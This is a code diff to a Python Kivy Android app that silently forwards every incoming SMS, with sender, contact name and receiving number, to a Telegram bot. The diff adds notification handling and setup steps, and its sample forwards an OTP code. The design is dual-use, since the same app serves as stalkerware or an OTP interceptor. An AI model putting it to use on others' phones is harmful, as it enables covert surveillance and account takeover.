@@ -1,3 +1,17 @@
+"""
+SMS to Telegram Forwarder - Complete Android App
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+Framework: Kivy + Pyjnius
+Build: Buildozer / GitHub Actions
+Features:
+- Background SMS receiving
+- Telegram bot integration
+- Contact name display
+- Sender & Receiver numbers
+- Silent operation (no UI needed)
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+"""
+
 from kivy.app import App
 from kivy.clock import Clock
 from jnius import autoclass, cast
@@ -28,6 +42,12 @@ Telephony = autoclass('android.provider.Telephony')
 TelephonyManager = autoclass('android.telephony.TelephonyManager')
 Uri = autoclass('android.net.Uri')
 ContactsContract = autoclass('android.provider.ContactsContract')
+
+# Android 15 notification support
+NotificationChannel = autoclass('android.app.NotificationChannel')
+NotificationManager = autoclass('android.app.NotificationManager')
+NotificationCompat = autoclass('androidx.core.app.NotificationCompat')
+Color = autoclass('android.graphics.Color')
 
 
 # ═══════════════════════════════════════════════════════════
@@ -115,15 +135,22 @@ class SMSForwarderApp(App):
     def build(self):
         print("🚀 SMS Forwarder App Starting...")
         
-        # Permissions request karo
+        # Permissions request karo (Android 15 compatible)
         print("📋 Requesting permissions...")
         request_permissions([
             Permission.READ_SMS,
             Permission.RECEIVE_SMS,
             Permission.SEND_SMS,
             Permission.READ_CONTACTS,
-            Permission.READ_PHONE_STATE
+            Permission.READ_PHONE_STATE,
+            Permission.POST_NOTIFICATIONS  # Android 13+ ke liye
         ])
+        
+        # Notification channel banao (Android 8+ required)
+        self.create_notification_channel()
+        
+        # Foreground notification show karo (Android 15 requirement)
+        self.show_foreground_notification()
         
         # SMS Receiver register karo
         self.register_sms_receiver()
@@ -134,10 +161,61 @@ class SMSForwarderApp(App):
             text="✅ SMS Forwarder Running\n\n"
                  "📱 SMS automatically forward honge\n"
                  "💬 Telegram pe check karo\n\n"
-                 "⚙️ Background mein chal raha hai",
+                 "⚙️ Background mein chal raha hai\n"
+                 "🔔 Notification bar check karo",
             halign='center',
             valign='middle'
         )
+    
+    def create_notification_channel(self):
+        """Android 8+ ke liye notification channel banao"""
+        try:
+            import android
+            if android.api_version >= 26:  # Android 8.0+
+                activity = PythonActivity.mActivity
+                
+                channel_id = "sms_forwarder_service"
+                channel_name = "SMS Forwarder Service"
+                
+                channel = NotificationChannel(
+                    channel_id,
+                    channel_name,
+                    NotificationManager.IMPORTANCE_LOW  # Low priority = silent
+                )
+                channel.setDescription("Background SMS forwarding service")
+                channel.enableLights(False)
+                channel.enableVibration(False)
+                
+                notification_manager = activity.getSystemService(Context.NOTIFICATION_SERVICE)
+                notification_manager.createNotificationChannel(channel)
+                
+                print("✅ Notification channel created")
+        except Exception as e:
+            print(f"⚠️ Notification channel error: {e}")
+    
+    def show_foreground_notification(self):
+        """Foreground service notification dikhao (Android 15 mandatory)"""
+        try:
+            activity = PythonActivity.mActivity
+            
+            # Notification builder
+            builder = NotificationCompat.Builder(activity, "sms_forwarder_service")
+            builder.setSmallIcon(activity.getApplicationInfo().icon)
+            builder.setContentTitle("SMS Forwarder Active")
+            builder.setContentText("Background mein SMS forward ho rahe hain")
+            builder.setPriority(NotificationCompat.PRIORITY_LOW)
+            builder.setOngoing(True)  # Swipe karke remove nahi hoga
+            builder.setAutoCancel(False)
+            
+            notification = builder.build()
+            
+            # Notification manager se show karo
+            notification_manager = activity.getSystemService(Context.NOTIFICATION_SERVICE)
+            notification_manager.notify(1, notification)
+            
+            print("✅ Foreground notification shown")
+        except Exception as e:
+            print(f"⚠️ Notification error: {e}")
     
     def register_sms_receiver(self):
         """SMS receiver ko Android system ke saath register karo"""
@@ -290,3 +368,75 @@ if __name__ == '__main__':
     SMSForwarderApp().run()
 
 
+"""
+═══════════════════════════════════════════════════════════════════
+                    SETUP INSTRUCTIONS
+═══════════════════════════════════════════════════════════════════
+
+1. TELEGRAM BOT SETUP:
+   ────────────────────
+   a) Telegram mein @BotFather search karo
+   b) /newbot command bhejo
+   c) Bot name aur username do
+   d) Bot Token copy karo
+   e) Code mein TELEGRAM_BOT_TOKEN paste karo
+
+2. CHAT ID NIKALO:
+   ────────────────────
+   a) @userinfobot ko Telegram pe message bhejo
+   b) Apna Chat ID copy karo
+   c) Code mein TELEGRAM_CHAT_ID paste karo
+
+3. BUILD KARO:
+   ────────────────────
+   Option A: GitHub Actions (Easiest)
+   - GitHub pe repo banao
+   - Code upload karo
+   - Automatic build hoga
+   
+   Option B: Local (Linux/WSL)
+   - buildozer android debug
+
+4. INSTALL & TEST:
+   ────────────────────
+   a) APK phone pe install karo
+   b) Permissions allow karo
+   c) App ek baar open karo
+   d) Test SMS bhejo
+   e) Telegram check karo!
+
+═══════════════════════════════════════════════════════════════════
+                    FEATURES
+═══════════════════════════════════════════════════════════════════
+
+✅ Background mein silently run hota hai
+✅ SMS automatically detect hota hai
+✅ Telegram pe instant forward hota hai
+✅ Sender aur Receiver dono numbers show hote hain
+✅ Contact name display (agar saved ho)
+✅ Timestamp with date & time
+✅ Clean formatted messages
+✅ Multiple devices support
+✅ Dual SIM support
+✅ Battery efficient (event-based)
+✅ No UI needed (minimal interface)
+
+═══════════════════════════════════════════════════════════════════
+                    TELEGRAM MESSAGE FORMAT
+═══════════════════════════════════════════════════════════════════
+
+📱 New SMS Received
+==============================
+
+👤 From (Contact): Rahul Kumar
+📤 From (Number): +91-9876543210
+
+📥 Received On: +91-8888888888
+🕒 Time: 26-12-2025 04:30:00 PM
+──────────────────────────────
+💬 Message:
+Your OTP is 123456
+==============================
+
+═══════════════════════════════════════════════════════════════════
+"""
